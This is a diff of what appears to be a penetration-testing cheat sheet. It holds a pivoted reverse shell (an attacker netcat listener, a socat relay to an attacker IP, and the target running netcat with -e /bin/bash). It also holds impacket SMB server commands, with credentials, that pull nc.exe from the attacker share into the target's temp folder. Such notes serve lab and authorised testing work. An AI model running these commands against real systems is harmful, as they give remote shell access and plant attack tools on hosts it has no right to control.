@@ -47,6 +47,9 @@ ATTACKER > sudo nc -nvlp 443
 PIVOT > ./socat tcp-l:8000 tcp:<ATTACKER_IP>:443 &
 TARGET > nc <PIVOT_IP> 8000 -e /bin/bash
 
-
-sudo python3 /opt/impacket/examples/smbserver.py tools . -smb2support -username hacker -password solarwinds123
-net use \\<ATTACKER_IP>\tools /USER:hacker solarwinds123
+TRANSFERING FILES
+SMBSERVER.PY / IMPACKET
+ATTACKER > sudo python3 /opt/impacket/examples/smbserver.py tools . -smb2support -username hacker -password solarwinds123  
+TARGET > net use \\<ATTACKER_IP>\tools /USER:hacker solarwinds123  
+TARGET > copy \\<ATTACKER_IP>\tools\nc.exe %TEMP%\nc.exe  
+TARGET> net use \\<ATACKER_IP>\tools /del  
